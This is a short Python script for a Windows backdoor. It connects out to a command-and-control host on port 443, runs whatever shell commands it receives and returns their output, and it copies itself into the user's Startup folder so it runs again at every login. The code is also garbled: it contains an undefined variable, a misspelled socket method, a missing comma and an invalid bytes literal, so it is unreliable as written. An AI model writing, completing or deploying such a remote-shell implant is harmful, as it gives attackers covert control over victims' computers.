import socket
import subprocess
import time
import threading
import os

CCIP = ""
CCPORT = 443

def autorun():
    filen =os.path.basename(__file__)
    exe_file = file.replace(".py", ".exe")
    print(exe_file)
    os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" ")


def conn(CCIP,CCPORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connecr((CCIP, CCPORT))
        return client
    except Exception as error:
        print(error)


def cmd(client,data):
    try:
        proc = subprocess.Popen(data, shell=True, stdin= subprocess.PIPE, stderr=subprocess.PIPE stdout=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        client.send(output + b "\n")
    except Exception as error:
        print(error)

def cli(client):
    try:
        while True:
            data = client.recv(1024).decode().strip()
            if data == "/:kill":
                return
            else:
                threading.Thread(target=cmd, args=(client, data)).start()
    except Exception as error:
        print(error)
        time.sleep(10)
        client.close()

if __name__ == "__main__":
    autorun()
    while True:
        client = conn(CCIP, CCPORT)
        if client:
            cli(client)
        else: 
            time.sleep(3)

